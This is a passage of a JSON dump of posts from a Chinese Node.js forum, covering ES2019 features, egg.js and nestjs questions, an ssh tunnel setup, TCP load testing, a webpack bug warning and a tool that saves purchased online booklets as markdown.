JavaScript</a></p>\n<h3>Array的flat()与flatMap()方法</h3>\n<p>如果你学习过函数式编程，那么你应该知道<a href=\"https://github.com/tc39/proposal-flatMap\">flat()和flatMap()</a>。flat()可以将一个包含嵌套数组的数组变换为一维数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>const nestedArraysOhMy = [ &quot;a&quot;, [&quot;b&quot;, &quot;c&quot;], [&quot;d&quot;, [&quot;e&quot;, &quot;f&quot;]]];\n&#x2F;&#x2F; flat()的参数为数组的嵌套深度\nconst ahhThatsBetter = nestedArraysOhMy.flat( 2 );\nconsole.log( ahhThatsBetter ); &#x2F;&#x2F; [ &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot; ]\n</code></pre><p>flatMap()与map()类似，当回调函数返回数组时，flatMap()返回的是一维数组，而map()返回的是嵌套数组：</p>\n<pre class=\"prettyprint language-javascript\"><code>const scattered = [ &quot;my favorite&quot;, &quot;hamburger&quot;, &quot;is a&quot;, &quot;chicken sandwich&quot; ];\n\nconst huh = scattered.map( chunk =&gt; chunk.split( &quot; &quot; ) );\nconsole.log( huh ); &#x2F;&#x2F; [ [ &quot;my&quot;, &quot;favorite&quot; ], [ &quot;hamburger&quot; ], [ &quot;is&quot;, &quot;a&quot; ], [ &quot;chicken&quot;, &quot;sandwich&quot; ] ]\n\nconst better = scattered.flatMap( chunk =&gt; chunk.split( &quot; &quot; ) );\nconsole.log( better ); &#x2F;&#x2F; [ &quot;my&quot;, &quot;favorite&quot;, &quot;hamburger&quot;, &quot;is&quot;, &quot;a&quot;, &quot;chicken&quot;, &quot;sandwich&quot; ]\n</code></pre><h3>其他ES2019候选特性</h3>\n<p>这些是当前的Stage 3候选特性：</p>\n<ul>\n<li><a href=\"https://github.com/tc39/proposal-global\">globalThis</a></li>\n<li><a href=\"https://github.com/tc39/proposal-dynamic-import\">动态import()</a></li>\n<li><a href=\"https://github.com/tc39/proposal-regexp-legacy-features\">遗留的RegExp特性</a> features</li>\n<li><a href=\"https://github.com/tc39/proposal-import-meta\">import.meta</a></li>\n<li><a href=\"https://github.com/tc39/proposal-string-matchall\">String的matchAll()方法</a></li>\n<li><a href=\"https://github.com/tc39/proposal-object-from-entries\">Object.fromEntries()</a></li>\n<li><a href=\"https://github.com/tc39/proposal-well-formed-stringify\">规范JSON.stringify</a></li>\n<li><a href=\"https://github.com/tc39/proposal-hashbang\">标准化命令行程序的Hashbang</a></li>\n</ul>\n<h3>ES2019什么时候发布？</h3>\n<p>过去几年，TC39通常在6月份发布ECMAScript标准。因此，ES2019很可能也会在今年6月份发布。</p>\n<h3>如何试用ES2019特性？</h3>\n<p>其实有些特性其实JS引擎已经支持了，我们只需要配置一下就好了。</p>\n<h4>使用Node.js 11</h4>\n<p>Node.js使用V8引擎，而V8引擎已经支持了一些最新的特性，例如Array.prototype.flat和String.prototype.trimEnd，因此使用最新版的Node.js，即Node.js 11即可试用这些特性。</p>\n<p>我使用的Node.js版本为11.8.0：</p>\n<pre class=\"prettyprint language-bash\"><code>node -v\nv11.8.0\n</code></pre><p>如果要启用某个特性，可以使用node命令的<code>--harmony-{feature-flag}</code>选项。使用<code>--v8-options</code>，则可以查看node命令的所有选项，一些实验性的特性被标记为&quot;in progress&quot;。</p>\n<p><strong>macOS / Linux</strong></p>\n<pre class=\"prettyprint language-bash\"><code>node --v8-options | grep &quot;in progress&quot;\n  --harmony-do-expressions (enable &quot;harmony do-expressions&quot; (in progress))\n  --harmony-class-fields (enable &quot;harmony fields in class literals&quot; (in progress))\n  --harmony-static-fields (enable &quot;harmony static fields in class literals&quot; (in progress))\n  --harmony-await-optimization (enable &quot;harmony await taking 1 tick&quot; (in progress))\n  --harmony-locale (enable &quot;Intl.Locale&quot; (in progress))\n  --harmony-intl-list-format (enable &quot;Intl.ListFormat&quot; (in progress))\n  --harmony-intl-relative-time-format (enable &quot;Intl.RelativeTimeFormat&quot; (in progress))\n</code></pre><p><strong>Windows</strong></p>\n<pre class=\"prettyprint language-bash\"><code>node --v8-options | find &quot;in progress&quot;\n</code></pre><p>例如，当我们的Node.js代码index.js中的Class有静态方法，则在执行的时候添加<code>--harmony-static-fields</code>选项即可：</p>\n<pre class=\"prettyprint language-bash\"><code>node --harmony-class-fields --harmony-static-fields index.js\n</code></pre><h4>使用Babel 7.0 +</h4>\n<p>使用Babel，我们就可以使用最新的JavaScript语法了，因为它会对代码进行转换以兼容旧的浏览器。</p>\n<p>Babel支持通过一些<a href=\"https://babeljs.io/docs/en/plugins\">插件</a>来支持实验性的JS特性。Babel所支持的ECMAScript特性提案可以查看<a href=\"https://github.com/babel/proposals/\">babel/proposals</a>仓库。</p>\n<h3>参考</h3>\n<ul>\n<li><a href=\"https://developer.okta.com/blog/2018/12/19/learn-javascript-in-2019\">Learn JavaScript in 2019!</a></li>\n<li><a href=\"https://developer.okta.com/blog/2019/01/16/history-and-future-of-async-javascript\">The History (and Future) of Asynchronous JavaScript</a></li>\n<li><a href=\"https://scotch.io/tutorials/build-a-secure-nodejs-application-with-javascript-async-await-using-hapi\">Build a Secure Node.js Application with JavaScript Async Await Using Hapi</a></li>\n<li><a href=\"https://developer.okta.com/blog/2018/11/15/node-express-typescript\">Use TypeScript to Build a Node API with Express</a></li>\n<li><a href=\"https://www.ecma-international.org/publications/standards/Ecma-262-arch.htm\">Standard ECMA-262</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：\n<a href=\"https://blog.fundebug.com/2019/01/30/what-is-new-in-javascript-for-2019/\">https://blog.fundebug.com/2019/01/30/what-is-new-in-javascript-for-2019/</a></p>\n</div>","title":"ECMASCript 2019可能会有哪些特性？","last_reply_at":"2019-01-30T03:04:36.452Z","good":false,"top":false,"reply_count":0,"visit_count":721,"create_at":"2019-01-30T03:04:36.452Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5b8605d32a585e4e2f26ff89","author_id":"59b7a76ee483de126798458e","tab":"ask","content":"<div class=\"markdown-text\"><p>在业务中抛出<code>js throw new Error('response status is not 200');</code> 这种错误的时候，在捕获的时候必须全局捕获处理，这样好像不太友好，框架本身有对这块做处理或者提供一些功能吗。或者由开发者本身来自定义一些错误然后抛出吗</p>\n</div>","title":"egg中的错误处理疑惑","last_reply_at":"2019-01-30T01:14:08.973Z","good":false,"top":false,"reply_count":7,"visit_count":1555,"create_at":"2018-08-29T02:32:51.499Z","author":{"loginname":"acodercat","avatar_url":"https://avatars3.githubusercontent.com/u/16076835?v=4&s=120"}},{"id":"5c50178a3819b801aa5a27b4","author_id":"59e6c301bcfcc03162f2ffc3","tab":"share","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>function makeClass(name) {\n  var Obj = class {\n    constructor(id) {\n      this.id = id\n    }\n    say(msg) {\n      console.log(name + &quot;&gt;&quot; + this.id + &quot;:&quot; + msg)\n    }\n  }\n  return Obj\n}\nvar Animal = makeClass(&quot;Animal&quot;)\nvar Bird = makeClass(&quot;Bird&quot;)\nvar bird = new Bird(&quot;1&quot;)\nbird.say(&quot;hello &quot;)\nvar animal = new Animal(&quot;2&quot;)\nanimal.say(&quot;你好&quot;)\nanimal.say = bird.say\nanimal.say(&quot;你好,代替&quot;)\n</code></pre></div>","title":"这样的状态oop好奇怪呀....","last_reply_at":"2019-01-29T13:49:41.472Z","good":false,"top":false,"reply_count":4,"visit_count":676,"create_at":"2019-01-29T09:06:18.013Z","author":{"loginname":"spitWind","avatar_url":"https://avatars2.githubusercontent.com/u/18753430?v=4&s=120"}},{"id":"5c483ffd6955112b994381c9","author_id":"5c3569483898674067a7cedb","tab":"share","content":"<div class=\"markdown-text\"><p>每年年末倍揪心，春运长征敌大军。最近大家见面的第一句话都是“抢到票了吗？”\n在惨烈的抢票大战中，总有一部分人是处于食物链底端的，明明网速不差，手速过关，抢票前还特意沐浴更衣、烧香礼佛，但跟回家的票就是无缘。</p>\n<p><img src=\"//static.cnodejs.org/FunUrPiAqJFwkKpL4LYsPRzONubB\" alt=\"1495789652-5c483c1fa4593_articlex.png\"></p>\n<p>在这一波气势磅礴的抢票队伍中可有你的身影？每天朋友圈分享的是不是各种加速包？票没抢到，助力红包发了多少？各种抢票神器齐上阵，究竟是如何掉进抢票陷阱？</p>\n<p><strong>今天这期漫画的主题是抢票陷阱，看看我们主人公“空格”是如何一步步掉进陷阱的。</strong></p>\n<p><img src=\"//static.cnodejs.org/Fpyb0QEi6y1M_-tPr3ljTOzrxu1S\" alt=\"1.png\"></p>\n<p><img src=\"//static.cnodejs.org/FqCYS9i38C3HyoUNRszKaEzt-EgM\" alt=\"2.png\"></p>\n<p><img src=\"//static.cnodejs.org/FjPeLeaaLgT4-pDkCHuemtRgAaCz\" alt=\"3.png\"></p>\n<p><img src=\"//static.cnodejs.org/FlkcIZe8FJyecXpEdPdXd1rEy92z\" alt=\"4.png\"></p>\n<p><img src=\"//static.cnodejs.org/FuAKjTLz7ma4SCAmy9iOxo4ktUcl\" alt=\"5.png\"></p>\n<p><img src=\"//static.cnodejs.org/FkVdJGe8Q2oamNOLJIqduDUHB9pK\" alt=\"6.png\"></p>\n<p><img src=\"//static.cnodejs.org/FvbmzymqIRfq_eOpGWfJ9nG5dglT\" alt=\"7.png\"></p>\n<p><img src=\"//static.cnodejs.org/FhlLOG97_RfgE_zIjvoZ-QNetGl0\" alt=\"8.png\"></p>\n<p><img src=\"//static.cnodejs.org/FggjwsQg3cjUPrH1jKfGlafGdgIl\" alt=\"9.png\"></p>\n<p><img src=\"//static.cnodejs.org/FlEcf8v_BfR5cUUBZKDDEEqWmIXf\" alt=\"10.png\"></p>\n<p><img src=\"//static.cnodejs.org/FlOqEucc7U8rBt1fejLLrsBrb2HI\" alt=\"11.png\"></p>\n</div>","title":"2019春节防坑指南之抢票陷阱（文末有彩蛋）","last_reply_at":"2019-01-29T08:46:19.594Z","good":false,"top":false,"reply_count":1,"visit_count":817,"create_at":"2019-01-23T10:20:45.946Z","author":{"loginname":"KevinSVIP","avatar_url":"https://avatars1.githubusercontent.com/u/30100519?v=4&s=120"}},{"id":"58b270477872ea0864fee0f8","author_id":"58b2702fe418a986315f3918","tab":"share","content":"<div class=\"markdown-text\"><h1>Tale</h1>\n<blockquote>\n<p>Tale的英文含义为<strong>故事</strong>，我相信每个坚持写Blog的人都是有故事的；中文你叫它 <strong><em>塌了</em></strong> 也无所谓 🤣。</p>\n</blockquote>\n<p><code>Tale</code> 使用了轻量级mvc框架 <a href=\"https://github.com/biezhi/blade\">Blade</a> 开发，默认主题使用了漂亮的 <a href=\"https://github.com/chakhsu/pinghsu\">pinghsu</a>，如果觉得这个项目不错，请为它<a href=\"https://github.com/otale/tale/stargazers\">点赞</a>支持。</p>\n<p>演示站点：<a href=\"https://tale.biezhi.me\">https://tale.biezhi.me</a></p>\n<p><a href=\"https://travis-ci.org/otale/tale\"><img src=\"https://img.shields.io/travis/otale/tale.svg?style=flat-square\" alt=\"Build Status\"></a>\n<a href=\"https://github.com/otale/tale/blob/master/LICENSE\"><img src=\"https://img.shields.io/badge/license-MIT-4EB1BA.svg?style=flat-square\" alt=\"License\"></a>\n<a href=\"http://weibo.com/u/5238733773\"><img src=\"https://img.shields.io/badge/weibo-%40biezhi-red.svg?style=flat-square\" alt=\"@biezhi on weibo\"></a></p>\n<p><a href=\"https://github.com/otale/tale/wiki\">开始使用</a>  |  <a href=\"https://github.com/otale/tale/issues/new\">参与贡献</a>  |  <a href>捐赠</a>  |  <a href>English</a></p>\n<h2>特性</h2>\n<ul>\n<li>设计简洁，界面美观</li>\n<li>Markdown文章发布</li>\n<li>自定义文章链接</li>\n<li>支持多主题</li>\n<li>支持Emoji表情</li>\n<li>支持网易云音乐播放</li>\n<li>支持附件和数据库备份</li>\n<li>部署发布简单</li>\n</ul>\n<h2>界面预览</h2>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a81d5f19.png\" alt=\"安装1\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a817ebc8.png\" alt=\"安装2\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a8142728.png\" alt=\"安装完成\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a82d91e7.png\" alt=\"后台登录\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a8416e6d.png\" alt=\"后台仪表盘\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a83bc9f4.png\" alt=\"发布文章\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a857b10e.png\" alt=\"文章管理\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a824bc28.png\" alt=\"页面管理\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a829c241.png\" alt=\"分类标签管理\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13a851741d.png\" alt=\"文件管理\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13ab1756ab.png\" alt=\"友链管理\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13ab231b4d.png\" alt=\"系统设置\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13ab1bba53.png\" alt=\"个人设置\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13ac013c10.png\" alt=\"首页\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13ab5d4035.png\" alt=\"文章页\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13ab57cb82.png\" alt=\"网易云文章页\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13ab1a1ef6.png\" alt=\"文章归档页\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13ab27ebe7.png\" alt=\"友情链接页\"></p>\n<p><img src=\"https://ooo.0o0.ooo/2017/02/25/58b13ab170f02.png\" alt=\"关于页\"></p>\n<h2>开源协议</h2>\n<p><a href>MIT</a></p>\n<h2>感谢</h2>\n<ul>\n<li><a href=\"https://github.com/pkwenda\">pkwenda</a></li>\n<li><a href=\"https://github.com/typecho/typecho\">typecho</a></li>\n<li><a href=\"https://github.com/chakhsu/pinghsu\">pinghsu</a></li>\n<li><a href=\"https://github.com/vdurmont/emoji-java\">emoji-java</a></li>\n<li><a href=\"https://github.com/vdurmont/emoji-java\">emoji-java</a></li>\n<li><a href=\"https://github.com/subchen/jetbrick-template-2x\">jetbrick-template</a></li>\n</ul>\n</div>","title":"简洁美观的Java博客系统Tale开源了，让每一个有故事的人更好的表达想法","last_reply_at":"2019-01-29T08:11:17.384Z","good":false,"top":false,"reply_count":5,"visit_count":7063,"create_at":"2017-02-26T06:05:59.117Z","author":{"loginname":"biezhi","avatar_url":"https://avatars.githubusercontent.com/u/3849072?v=3&s=120"}},{"id":"5c4846156955112b994381da","author_id":"5c4845863b948a2b4ab70de3","tab":"ask","content":"<div class=\"markdown-text\"><p><strong>nestjs中如何链接现有的数据库并查询表数据</strong>\n1.如何检测链接数据库成功？\n2.如果不实用entity如何通过数据库语句创建表插入数据\n3.如何写查询语句在nestjs里面\n如果有知道的，麻烦告知一些，非常感谢</p>\n</div>","title":"nestjs中如何链接现有的数据库并查询表数据？","last_reply_at":"2019-01-29T07:14:35.060Z","good":false,"top":false,"reply_count":1,"visit_count":961,"create_at":"2019-01-23T10:46:45.793Z","author":{"loginname":"Wuuuu","avatar_url":"https://avatars2.githubusercontent.com/u/15084300?v=4&s=120"}},{"id":"5c46b5616955112b994379a2","author_id":"5b03c9a7000332b81cf821a5","tab":"ask","content":"<div class=\"markdown-text\"><p>Function.__proto__指向一个匿名函数function(){} ,匿名函数的__proto__指向Object的prototype ,Object的__proto__指向Function 的 prototype.</p>\n</div>","title":"大佬们能理解这句话吗？","last_reply_at":"2019-01-29T07:09:57.961Z","good":false,"top":false,"reply_count":19,"visit_count":1642,"create_at":"2019-01-22T06:17:05.811Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5b90f53937b3005a0b0e6c0c","author_id":"537cbe4ea087f456203ef9be","tab":"ask","content":"<div class=\"markdown-text\"><p>公司有个用NODE写的TCP的server，想做关于这个项目的压力测试 没有什么思路，请教一下大家。\n假设我有一个这样的tcp server</p>\n<pre class=\"prettyprint\"><code>var net = require(&#x27;net&#x27;);\n\nvar HOST = &#x27;127.0.0.1&#x27;;\nvar PORT = 6969;\n\n&#x2F;&#x2F; 创建一个TCP服务器实例，调用listen函数开始监听指定端口\n&#x2F;&#x2F; 传入net.createServer()的回调函数将作为”connection“事件的处理函数\n&#x2F;&#x2F; 在每一个“connection”事件中，该回调函数接收到的socket对象是唯一的\nnet.createServer(function(sock) {\n\n    &#x2F;&#x2F; 我们获得一个连接 - 该连接自动关联一个socket对象\n    console.log(&#x27;CONNECTED: &#x27; +\n        sock.remoteAddress + &#x27;:&#x27; + sock.remotePort);\n\n    &#x2F;&#x2F; 为这个socket实例添加一个&quot;data&quot;事件处理函数\n    sock.on(&#x27;data&#x27;, function(data) {\n        console.log(&#x27;DATA &#x27; + sock.remoteAddress + &#x27;: &#x27; + data);\n        &#x2F;&#x2F; 回发该数据，客户端将收到来自服务端的数据\n        sock.write(&#x27;You said &quot;&#x27; + data + &#x27;&quot;&#x27;);\n    });\n\n    &#x2F;&#x2F; 为这个socket实例添加一个&quot;close&quot;事件处理函数\n    sock.on(&#x27;close&#x27;, function(data) {\n        console.log(&#x27;CLOSED: &#x27; +\n            sock.remoteAddress + &#x27; &#x27; + sock.remotePort);\n    });\n\n}).listen(PORT, HOST);\n\nconsole.log(&#x27;Server listening on &#x27; + HOST +&#x27;:&#x27;+ PORT);\n</code></pre><p>我应该写一个怎样的测试client的node脚本，来测试比如我本机能达到多少的client连接数</p>\n</div>","title":"TCP 的压力测试改怎么做？","last_reply_at":"2019-01-29T07:06:06.434Z","good":false,"top":false,"reply_count":4,"visit_count":1262,"create_at":"2018-09-06T09:36:57.311Z","author":{"loginname":"MxBird","avatar_url":"https://avatars1.githubusercontent.com/u/1635421?v=4&s=120"}},{"id":"5c4f022c3819b801aa5a22e7","author_id":"57a3f44d7a922d6f358cd222","tab":"ask","content":"<div class=\"markdown-text\"><p>场景是这样的，由于安全，公司的远程机器 只开放了 ssh 2289 端口， 而mysql 服务所在的 3306被封了</p>\n<p>我的egg.js 希望能够访问到远程的库，不知道如何办？</p>\n<p>我上网搜索了， 可以使用 tunnel-ssh 创建通道后进行连接，但是很多地方不懂</p>\n<p>我在 egg.js/config.default.js 内写了如下代码</p>\n<p>config.sequelize = {\ndialect: ‘mysql’, // support: mysql, mariadb, postgres, mssql\ndatabase: ‘some platform’,\nhost: ‘127.0.0.1’,\nport: 3306,\nusername: ‘root’,\npassword: ‘sercet’,\n};</p>\n<p>// if (nowEnv.ip === ‘211.159.232.30’) {\nconst sshConfig = {\nuser: ‘user’,\nPassword: ‘sercet’,\nhost: ‘sercet’,\nport: 2289,\ndstHost: ‘sercet’,\ndstPort: 3306,\nlocalHost: ‘127.0.0.1’,\nlocalPort: 3306,\n};</p>\n<p>tunnel(sshConfig, function(error, server) {\nif (error) {\nconsole.log(error);\n} else {\n\t   // do something\n}\n});</p>\n<p>目前是 ssh 已经可以连上了，但是无法访问数据服务，报错：\n<img src=\"//static.cnodejs.org/FjpJXvIYmmB-xWoPTMOmfO6MQZTL\" alt=\"image.png\"><br>\n我的问题：</p>\n<ol>\n<li>如何成功连上数据库</li>\n<li>dstHost、 dstPort、localHost、localPort 等字段是什么意思，不太熟悉</li>\n</ol>\n</div>","title":"请问 eggJs 如何使用 tunnel-ssh 连接远程数据库？","last_reply_at":"2019-01-29T06:50:47.745Z","good":false,"top":false,"reply_count":3,"visit_count":552,"create_at":"2019-01-28T13:22:52.119Z","author":{"loginname":"NumerHero","avatar_url":"https://avatars0.githubusercontent.com/u/12696061?v=4&s=120"}},{"id":"5979b535518c054e4fc0c1af","author_id":"5957a135acfce9295ba072f0","tab":"ask","content":"<div class=\"markdown-text\"><p>是这样的，因为要做数据的联调，所以必须tcp之类的通信\n可是毕竟硬件传过来的事hex 也就是二进制的数据，\n类似下面这中数据，我本想用构造去做，不过因为有些长度是会变的，所以很难处理，如果要按硬件一次一次轮询的去判断，switch实在太多了，求大佬的经验之谈！</p>\n<pre class=\"prettyprint\"><code>53 54 41 54 00 0F 01 00 00 00 00 00 00 BB 01 AA 09 BB 01 00 01 00 00 00 00 00 01 0E CC 33 45 4E 44 \n\n53 54 41 54 (STAT)\n\n00 0F  (长度)\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n\n01    （cmd）\n\n00 00 00 00 00 00  （网关ID）\n\nBB \n\n01 (模块数量)\n\n      AA   （头）\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\15\n      09   （长度）16\n      BB 17\n      01 00 （设备类型） 18\n      01 00 00 00 00 00  （设备ID）20\n      01 (具体的数据)26\n      0E （子crc）27\n      CC    （模块数据结束）28\n\n33  CRC(总)\n\n45 4E 44 （END） \n</code></pre></div>","title":"【硬件问题】关于tcp与buffer","last_reply_at":"2019-01-29T03:32:34.326Z","good":false,"top":false,"reply_count":8,"visit_count":1924,"create_at":"2017-07-27T09:41:09.229Z","author":{"loginname":"Lanseria","avatar_url":"https://avatars3.githubusercontent.com/u/14802764?v=4&s=120"}},{"id":"5c45c4c66955112b994376ee","author_id":"5b376dfcac8bc1e124114500","tab":"ask","content":"<div class=\"markdown-text\"><p>hi 最近有个 小问题在困扰这我\n在restful 规范下想写一个获取客户(user) 的商品 (Product) url 怎么写才靠谱</p>\n<p>方法1: /user/:<em>id</em>/products\n方法2: /products?userId=<em>:id</em></p>\n<h2>各位同伴哪个比较靠谱？或者你还有其他翻案？</h2>\n</div>","title":"获取 User 下的 Product 的 URL 你会怎么写？","last_reply_at":"2019-01-28T14:24:40.129Z","good":false,"top":false,"reply_count":7,"visit_count":890,"create_at":"2019-01-21T13:10:30.375Z","author":{"loginname":"tmirun","avatar_url":"https://avatars1.githubusercontent.com/u/8052536?v=4&s=120"}},{"id":"5c4e78603819b801aa5a1e64","author_id":"5afd3b2a0a36e5312d6ed20a","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FrNC7s39h0uJzMU8KVYjGxs-ERO3\" alt=\"image.png\">\n环境:\nubuntu:16.04\nnode:10.15.0\nmongo:4.05\nredis:5.0</p>\n<p>是不是因为软件版本过高的问题</p>\n<p><a href=\"https://github.com/cnodejs/nodeclub/issues/1066\">https://github.com/cnodejs/nodeclub/issues/1066</a></p>\n</div>","title":"ubuntu nodeclub安装的一系列问题求解，issues：#1066","last_reply_at":"2019-01-28T08:54:56.759Z","good":false,"top":false,"reply_count":2,"visit_count":466,"create_at":"2019-01-28T03:34:56.489Z","author":{"loginname":"nanhupatar","avatar_url":"https://avatars1.githubusercontent.com/u/27266016?v=4&s=120"}},{"id":"5c4e666fa4647e02328f186f","author_id":"5adb4257464b1bfa6b42582a","tab":"ask","content":"<div class=\"markdown-text\"><p>最近公司要做签到功能，本来很简单的事情，却要表现本日，本周，本月，本月，本年，累计排行(╯°口°)╯\n考虑到签到每天都会产生数据，数据有几百万条，又是冷数据，所以我们只保留一年的数据，多余的数据全部删掉\n最后我们的做法是，给签到表添加日，周，月，年字段，但累计直接累加保存到user表中，避免累计查询，变保存各个数据过期时间，下次查询的时候检验过期时间，如果过期就删除数据，这样就可以将数据一直保持在一年中\n但问题是这样是全查表，删除数据太过频繁，不知道大家有没有更好的处理方法</p>\n</div>","title":"数据库一边增加数据一边删除数据是否合理","last_reply_at":"2019-01-28T04:51:54.424Z","good":false,"top":false,"reply_count":3,"visit_count":935,"create_at":"2019-01-28T02:18:23.471Z","author":{"loginname":"Beats0","avatar_url":"https://avatars2.githubusercontent.com/u/29087203?v=4&s=120"}},{"id":"5c4c929a595cbd1e95088b3a","author_id":"59eeb8e11bbf067d5c3fa7c6","tab":"share","content":"<div class=\"markdown-text\"><p>今天在编译CabloyJS项目时，突然编译失败，错误提示如下：</p>\n<blockquote>\n<p>Module parse failed: ‘import’ and ‘export’ may only appear at the top level (127:10)</p>\n</blockquote>\n<p>常规情况下，出现这种错误，只需要在.babelrc中添加插件即可</p>\n<blockquote>\n<p>“plugins”: [&quot;<a href=\"/user/babel\">@babel</a>/plugin-syntax-dynamic-import&quot;]</p>\n</blockquote>\n<p>在明明已经正确配置.babelrc的情况下，仍出现这种错误，除了反复查阅babel和webpack最新文档外，只有google了。</p>\n<p>历经千辛万苦，终于找到一个帖子：\n<a href=\"https://github.com/webpack/webpack/issues/8656\">https://github.com/webpack/webpack/issues/8656</a></p>\n<p>仅仅是因为webpack升级为4.29.0导致的。只能暂时将webpack锁定版本4.28.4解决此问题了。</p>\n</div>","title":"紧急提示：Webpack 4.29.0 编译出错","last_reply_at":"2019-01-28T03:18:02.294Z","good":false,"top":false,"reply_count":7,"visit_count":998,"create_at":"2019-01-26T17:02:18.583Z","author":{"loginname":"zhennann","avatar_url":"https://avatars1.githubusercontent.com/u/24246985?v=4&s=120"}},{"id":"5c4d93a2f9075c1ef7138866","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>比如，我输入关键词 “阿巴”，也能搜出 “阿里巴巴”</p>\n</div>","title":"请问下 mysql 如何实现不连续模糊查询","last_reply_at":"2019-01-28T01:34:46.758Z","good":false,"top":false,"reply_count":4,"visit_count":894,"create_at":"2019-01-27T11:18:58.281Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c47372b3b948a2b4ab70951","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/oliyg/juejinxiaoce\">github 仓库欢迎 star</a></p>\n<p>采用 node https 模块，获取已购买小册 html 代码，并将 html 代码转换为 markdown 格式文件保存本地。</p>\n<p><strong>注意：目前本项目有两个版本，v2 不需要使用 chromium 作为无头浏览器；v1 则使用 chromi 作为无头浏览器模拟用户登录网站；</strong></p>\n<p>根据需要选择不同版本</p>\n<ul>\n<li>v2：\n<ul>\n<li><a href=\"https://github.com/oliyg/juejinxiaoce/releases\">latest</a></li>\n</ul>\n</li>\n<li>v1 不再维护：\n<ul>\n<li><a href=\"https://github.com/oliyg/juejinxiaoce/releases/tag/1.1.2\">release v1</a></li>\n</ul>\n</li>\n</ul>\n<h2>使用方法</h2>\n<p><strong>⚠️ 注意：掘金不支持境外网络访问，因此不要使用代理</strong></p>\n<h3>方法一：npx 直接执行</h3>\n<p>在本地某目录中执行 <code>npx @oliyg/juejinxiaoce</code> 按照提示输入用户名密码以及小册 ID 当提示 all done 完成</p>\n<pre class=\"prettyprint\"><code>➜  Desktop npx @oliyg&#x2F;juejinxiaoce\nnpx: 98 安装成功，用时 10.748 秒\nemail: 输入你的用户名密码\npassword: 输入你的用户名密码\nbookId: 小册 ID\n===navagating to main page\n===login...\n===getting book section list\n===getting book HTML content\n面试常用技巧\n===writing html...\n===getting book HTML content\n===write html file success\n===writing markdown...\n===write markdown file success\n前方的路，让我们结伴同行\n===writing html...\n===write html file success\n===writing markdown...\n===write markdown file success\n\n======\nAll Done...Enjoy.\n======\n</code></pre><p>在执行命令的这个目录中可以找到一个名为 md xxx 的文件夹，内包含 md 文档；在上面这个例子中，我们在 Desktop 桌面目录执行命令，因此在桌面目录中会生成这个文件夹：</p>\n<pre class=\"prettyprint language-shell\"><code>➜  md 1548483715543 ls -al\ntotal 40\ndrwxr-xr-x  4 oli  staff   128  1 26 14:22 .\ndrwx------+ 9 oli  staff   288  1 26 14:21 ..\n-rw-r--r--  1 oli  staff  4915  1 26 14:21 面试常用技巧.md\n-rw-r--r--  1 oli  staff  8465  1 26 14:22 前方的路，让我们结伴同行.md\n</code></pre><h3>方法二：npm i 命令</h3>\n<p>使用 <code>npm i -g</code> 安装，并使用 <code>juejinxiaoce</code> 命令执行：</p>\n<pre class=\"prettyprint\"><code>➜  Desktop npm i -g @oliyg&#x2F;juejinxiaoce\n&#x2F;Users&#x2F;oli&#x2F;.nvm&#x2F;versions&#x2F;node&#x2F;v8.12.0&#x2F;bin&#x2F;juejinxiaoce -&gt; &#x2F;Users&#x2F;oli&#x2F;.nvm&#x2F;versions&#x2F;node&#x2F;v8.12.0&#x2F;lib&#x2F;node_modules&#x2F;@oliyg&#x2F;juejinxiaoce&#x2F;bin&#x2F;juejinxiaoce\n+ @oliyg&#x2F;juejinxiaoce@2.2.1\nadded 98 packages from 201 contributors in 5.89s\n➜  Desktop juejinxiaoce\nemail:\npassword:\nbookId:\n===navagating to main page\n===login...\n...\n...\n</code></pre><blockquote>\n<p>小册ID见 URL 链接：</p>\n<p><img src=\"https://i.loli.net/2019/01/20/5c4499929e48e.png\" alt=\"20190120235353.png\"></p>\n</blockquote>\n<p>执行后等待出现消息 <code>all done. enjoy.</code> 